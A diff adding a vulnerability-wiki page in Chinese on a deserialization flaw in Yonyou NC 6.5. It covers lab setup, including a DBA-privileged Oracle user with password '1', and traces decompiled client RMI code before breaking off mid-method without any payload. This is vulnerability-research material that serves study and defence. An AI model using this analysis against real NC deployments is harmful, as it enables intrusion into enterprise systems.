@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8Bnc%206.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>用友nc 6.5 反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7528\u53cbnc 6.5 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FThinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FThinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        申瓯通信在线录音管理系统Thinkphp远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%A8%E5%8F%8BOA/%E7%95%85%E6%8D%B7%E9%80%9ATPlus-KeyInfoList.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%A8%E5%8F%8BOA/%E7%95%85%E6%8D%B7%E9%80%9ATPlus-KeyInfoList.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        畅捷通TPlus KeyInfoList.aspx存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="nc-65">用友nc 6.5 反序列化漏洞<a class="headerlink" href="#nc-65" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>用友nc 6.5</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ul>
+<li>1.执行NC安装包根目录下setup.bat文件（要求安装盘同级目下有ufjdk文件或者设置JAVA_HOME环境变量），安装时，出现如下图界面;</li>
+</ul>
+<p><img alt="1.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
+<ul>
+<li>2.选择安装的产品，这里我只安装了部分与NC相关的模块。下面对NC产品模块做个简要说明;</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    nc_uap              客户化
+    nc_portal           企业门户
+    nc_pd               工程基础数据
+    nc_fi               财务会计
+    nc_tpb              全面计划预算
+    nc_co_cm            管理会计
+    nc_tm               资金管理
+    nc_scm              供应链管理
+    nc_qc               质量管理
+    nc_am               资产管理
+    nc_mm               生产制造
+    nc_hr               人力资源
+    nc_hr_pd            人力资源预制
+    nc_iufo             网络报表含合并报表
+    nc_xbrl             集团报表XBRL</p>
+<ul>
+<li>3.至此NC已安装完成，接下来创建Oracle用户;</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    SQL&gt; create user NCV6.5 identified by 1 default tablespace nnc_data01 temporary tablespace temp; 
+    SQL&gt; grant dba,connect to NCV6.5;</p>
+<ul>
+<li>4.配置sysConfig，产品安装完成之后会自动进入系统配置界面;</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+-   服务器类型选择UAP SERVER。点击服务器信息→读取，如下图：</p>
+<p><img alt="2.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<ul>
+<li>进入"数据源页签"→"读取"→"添加",将NC
+    V6.5作为账套数据源，数据库类型选择ORACLE11G，添加数据源名称，不能包含中文。配置数据库地址、用户名密码、失效链接检查周期、prepareStatement缓存数等信息，完成后点击测试，如果提示测试通过则表示NC能够与数据库连通，保存即可。</li>
+</ul>
+<p><img alt="3.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<ul>
+<li>进入"安全日志数据源页签"→"读取"，初始化数据源，初始化完成后点击"确定"。</li>
+</ul>
+<p><img alt="4.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
+<ul>
+<li>进入"部署"→"全选"→"部署EJB"， 此处用于生成、部署EJB，如下图所示：</li>
+</ul>
+<p><img alt="5.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
+<ul>
+<li>进入"文件服务器"→"读取"，此处添加服务器ip地址，端口，存储路径，及选择元数据仓库,如下图所示：</li>
+</ul>
+<p><img alt="6.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
+<p>5.环境搭建完成。因为通过浏览器访问的方式需要依赖不同用户设备上的Java版本以及系统配置等环境因素，所以为了避免这些不必要的麻烦，可以使用专用浏览器UClient来解决此问题。</p>
+<p><img alt="7.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
+<h3 id="_5">漏洞分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>下载UClient并安装后，进入启动页面，选择添加应用。</p>
+<p><img alt="8.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
+<p>在其安装目录里发现了NCLogin65.jar，通过对其反编译进行查看发现，它里面只是一些界面和登录逻辑代码，主要的通信代码并不在该jar包中。</p>
+<p><img alt="9.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
+<p>继续在其他目录下的寻找，发现该目录(nc_client_home\NCCACHE\CODE)中的子目录含有许多jar包，其中external目录中的jar包是负责客户端与服务端之间通信的逻辑代码。</p>
+<p><img alt="10.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
+<p>通过对登录流程的动态调试，最后找到了对应的类(nc.login.ui.LoginUISuppor)，并定位到该类中处理登录请示的方法(getLoginRequest())</p>
+<p><img alt="11.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png" /></p>
+<p>执行getInstance()，获取NCLocator的实例，然后执行NCLocator实例的lookup()方法</p>
+<p><img alt="12.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
+<p>查看nc.bs.framework.common.NCLocator#getInstance(java.util.Properties)</p>
+<p><img alt="13.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId38.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="c1">//nc.bs.framework.common.NCLocator#getInstance</span>
+<span class="n">locator</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="n">NCLocator</span><span class="p">)</span><span class="n">locatorMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">locator</span><span class="w"> </span>!<span class="p">=</span><span class="w"> </span><span class="nb">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="n">locator</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>!<span class="n">isEmpty</span><span class="p">(</span><span class="n">locatorProvider</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="n">locator</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">newInstance</span><span class="p">(</span><span class="n">locatorProvider</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>!<span class="n">isEmpty</span><span class="p">(</span><span class="n">svcDispatchURL</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="n">locator</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">newInstance</span><span class="p">(</span><span class="s">&quot;nc.bs.framework.rmi.RmiNCLocator&quot;</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="n">locator</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">getDefaultLocator</span><span class="p">();</span>
+<span class="w">          </span><span class="p">}</span>
+
+<span class="w">          </span><span class="n">locator</span><span class="p">.</span><span class="n">init</span><span class="p">(</span><span class="n">props</span><span class="p">);</span>
+<span class="w">          </span><span class="n">locatorMap</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">locator</span><span class="p">);</span>
+<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="n">locator</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+</code></pre></div>
+
+<p>由于程序刚启动的时候locatorMap的值为空，则会进入下面的分支语句中去判断locatorProvider值，而此时又因为locatorProvider的值为空，svcDispatchURL的值(<a href="http://ip:port/ServiceDispatcherServlet)不为空">http://ip:port/ServiceDispatcherServlet)不为空</a>，所以会创建RmiNCLocator实例，将其存放至locatorMap中。获取到RmiNCLocator实例后，查看其lookup()方法：</p>
+<p><img alt="14.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId39.png" /></p>
+<p>继续跟进nc.bs.framework.server.RemoteMetaContext#lookup()：</p>
+<p><img alt="15.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId40.png" /></p>
+<p>从proxyMap中查看是否存在参数name，如果存在则直接返回，不存在则进入下面的分支。查看getMetaOnDemand()方法：</p>
+<p><img alt="16.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId41.png" /></p>
+<p>可以看到当metaV0值为空的时候，又调用了this.remoteMetaContext.lookup()方法，在当前类中搜索remoteMetaContext，发现在类构造函数中创建了一个代理并将其赋值到this.remoteMetaContext：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="n">nc</span><span class="o">.</span><span class="n">bs</span><span class="o">.</span><span class="n">framework</span><span class="o">.</span><span class="n">rmi</span><span class="o">.</span><span class="n">RemoteContextStub</span><span class="c1">#RemoteContextStub</span>
+<span class="n">public</span><span class="w"> </span><span class="n">RemoteContextStub</span><span class="p">(</span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">dispatchURL</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">module</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">ComponentException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">ComponentMetaVO</span><span class="w"> </span><span class="n">metaVO</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">ComponentMetaVO</span><span class="p">();</span>
+<span class="w">      </span><span class="n">metaVO</span><span class="o">.</span><span class="n">setInterfaces</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="p">[]{</span><span class="n">Context</span><span class="o">.</span><span class="k">class</span><span class="o">.</span><span class="n">getName</span><span class="p">()});</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">module</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">metaVO</span><span class="o">.</span><span class="n">setModule</span><span class="p">(</span><span class="n">module</span><span class="p">);</span>
+<span class="w">          </span><span class="n">metaVO</span><span class="o">.</span><span class="n">setName</span><span class="p">(</span><span class="s2">&quot;nc.bs.framework.server.RemoteMetaContext.&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">module</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">metaVO</span><span class="o">.</span><span class="n">setName</span><span class="p">(</span><span class="s2">&quot;nc.bs.framework.server.RemoteMetaContext&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">namedMetasMap</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">metaVO</span><span class="o">.</span><span class="n">getName</span><span class="p">(),</span><span class="w"> </span><span class="n">metaVO</span><span class="p">);</span>
+<span class="w">      </span><span class="n">Address</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
+
+<span class="w">      </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Address</span><span class="p">(</span><span class="n">dispatchURL</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">MalformedURLException</span><span class="w"> </span><span class="n">var6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">ComponentException</span><span class="p">(</span><span class="s2">&quot;invalid url: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">dispatchURL</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">defRas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">SimpleRemoteAddressSelector</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">remoteMetaContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Context</span><span class="p">)</span><span class="n">RemoteProxyFactory</span><span class="o">.</span><span class="n">getDefault</span><span class="p">()</span><span class="o">.</span><span class="n">createRemoteProxy</span><span class="p">(</span><span class="n">RemoteContextStub</span><span class="o">.</span><span class="k">class</span><span class="o">.</span><span class="n">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="n">metaVO</span><span class="p">,</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">defRas</span><span class="p">);</span>
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">proxyMap</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">metaVO</span><span class="o">.</span><span class="n">getName</span><span class="p">(),</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">remoteMetaContext</span><span class="p">);</span>
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">dispatchUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">;</span>
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">module</span><span class="p">;</span>
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">init</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+</code></pre></div>
+
+<p>通过java代理的相关知识可以知道，无论调用代理对象的任何方法，该方法都会调用处理器的invoke方法，在本程序中即是nc.bs.framework.rmi.RemoteInvocationHandler#invoke：</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">//nc.bs.framework.rmi.RemoteInvocationHandler#invoke</span>
+<span class="kr">public</span><span class="w"> </span><span class="nb">Object</span><span class="w"> </span><span class="nx">invoke</span><span class="p">(</span><span class="nb">Object</span><span class="w"> </span><span class="nx">proxy</span><span class="p">,</span><span class="w"> </span><span class="nx">Method</span><span class="w"> </span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nb">Object</span><span class="p">[]</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="kr">throws</span><span class="w"> </span><span class="nx">Throwable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nb">String</span><span class="w"> </span><span class="nx">mn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">method</span><span class="p">.</span><span class="nx">getName</span><span class="p">();</span>
+<span class="w">      </span><span class="nx">Class</span><span class="cp">&lt;?</span><span class="o">&gt;</span><span class="p">[]</span> <span class="nx">ps</span> <span class="o">=</span> <span class="nx">method</span><span class="o">.</span><span class="nx">getParameterTypes</span><span class="p">();</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">mn</span><span class="o">.</span><span class="nx">equals</span><span class="p">(</span><span class="s2">&quot;equals&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ps</span><span class="o">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">ps</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">equals</span><span class="p">(</span><span class="nx">Object</span><span class="o">.</span><span class="nx">class</span><span class="p">))</span> <span class="p">{</span>
+          <span class="nx">Object</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+          <span class="k">if</span> <span class="p">(</span><span class="nx">value</span> <span class="o">!=</span> <span class="k">null</span> <span class="o">&amp;&amp;</span> <span class="nx">Proxy</span><span class="o">.</span><span class="nx">isProxyClass</span><span class="p">(</span><span class="nx">value</span><span class="o">.</span><span class="nx">getClass</span><span class="p">()))</span> <span class="p">{</span>
+              <span class="nx">Object</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">Proxy</span><span class="o">.</span><span class="nx">getInvocationHandler</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
+              <span class="k">return</span> <span class="o">!</span><span class="p">(</span><span class="nx">h</span> <span class="nx">instanceof</span> <span class="nx">RemoteInvocationHandler</span><span class="p">)</span> <span class="o">?</span> <span class="nx">Boolean</span><span class="o">.</span><span class="k">FALSE</span> <span class="o">:</span> <span class="k">this</span><span class="o">.</span><span class="nx">meta</span><span class="o">.</span><span class="nx">equals</span><span class="p">(((</span><span class="nx">RemoteInvocationHandler</span><span class="p">)</span><span class="nx">h</span><span class="p">)</span><span class="o">.</span><span class="nx">meta</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="nx">ras</span><span class="o">.</span><span class="nx">equals</span><span class="p">(((</span><span class="nx">RemoteInvocationHandler</span><span class="p">)</span><span class="nx">h</span><span class="p">)</span><span class="o">.</span><span class="nx">ras</span><span class="p">);</span>
+          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+              <span class="k">return</span> <span class="nx">Boolean</span><span class="o">.</span><span class="k">FALSE</span><span class="p">;</span>
+          <span class="p">}</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">mn</span><span class="o">.</span><span class="nx">equals</span><span class="p">(</span><span class="s2">&quot;hashCode&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ps</span><span class="o">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="nx">meta</span><span class="o">.</span><span class="nx">hashCode</span><span class="p">()</span> <span class="o">+</span> <span class="mi">27</span> <span class="o">*</span> <span class="k">this</span><span class="o">.</span><span class="nx">ras</span><span class="o">.</span><span class="nx">hashCode</span><span class="p">();</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">mn</span><span class="o">.</span><span class="nx">equals</span><span class="p">(</span><span class="s2">&quot;toString&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ps</span><span class="o">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="nx">meta</span><span class="o">.</span><span class="nx">toString</span><span class="p">();</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="nx">method</span><span class="o">.</span><span class="nx">getDeclaringClass</span><span class="p">()</span> <span class="o">==</span> <span class="nx">RemoteProxy</span><span class="o">.</span><span class="k">class</span> <span class="err">? </span><span class="nc">method</span><span class="o">.</span><span class="nx">invoke</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">args</span><span class="p">)</span> <span class="o">:</span> <span class="k">this</span><span class="o">.</span><span class="nx">sendRequest</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
+      <span class="p">}</span>
+  <span class="p">}</span>
+</code></pre></div>
+
+<p>此时mn的值为"lookup"，因此会进入最后一条分支语句中，又因为二者不等，最终会执行this.sendRequest(method,
+args)方法</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="n">nc</span><span class="o">.</span><span class="n">bs</span><span class="o">.</span><span class="n">framework</span><span class="o">.</span><span class="n">rmi</span><span class="o">.</span><span class="n">RemoteInvocationHandler</span><span class="c1">#sendRequest</span>
+<span class="n">public</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">sendRequest</span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="p">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">InvocationInfo</span><span class="w"> </span><span class="n">ii</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">newInvocationInfo</span><span class="p">(</span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
+<span class="w">      </span><span class="n">Address</span><span class="w"> </span><span class="n">old</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
+<span class="w">      </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">retry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ConnectorFailException</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
+
+<span class="w">      </span><span class="n">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">Address</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">ras</span><span class="o">.</span><span class="n">select</span><span class="p">();</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">old</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="n">Logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&quot;connect to: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">old</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot; failed, now retry connect to: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">target</span><span class="p">);</span>
+<span class="w">              </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">old</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">target</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                  </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                      </span><span class="n">Thread</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">retryInterval</span><span class="p">);</span>
+<span class="w">                  </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">var13</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                      </span><span class="p">;</span>
+<span class="w">                  </span><span class="p">}</span>
+<span class="w">              </span><span class="p">}</span>
+<span class="w">          </span><span class="p">}</span>
+
